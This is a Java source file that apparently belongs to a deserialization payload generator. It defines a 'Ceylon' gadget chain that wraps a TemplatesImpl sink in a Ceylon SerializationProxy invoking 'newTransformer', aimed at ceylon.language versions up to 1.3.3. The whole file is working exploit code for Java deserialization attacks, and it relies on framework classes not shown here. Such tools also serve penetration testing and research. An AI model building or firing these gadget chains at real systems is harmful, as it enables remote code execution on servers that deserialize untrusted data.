package com.ppp.chain.others;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.redhat.ceylon.compiler.java.language.SerializationProxy;

import javax.xml.transform.Templates;

/**
 * @author Whoopsunix
 */
@Authors({Authors.KULLRICH})
@Dependencies({"org.ceylon-lang:ceylon.language:<=1.3.3"})
@Sink({Sink.TemplatesImpl})
public class Ceylon implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Ceylon.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        return new SerializationProxy(templates, Templates.class, "newTransformer");
    }
}
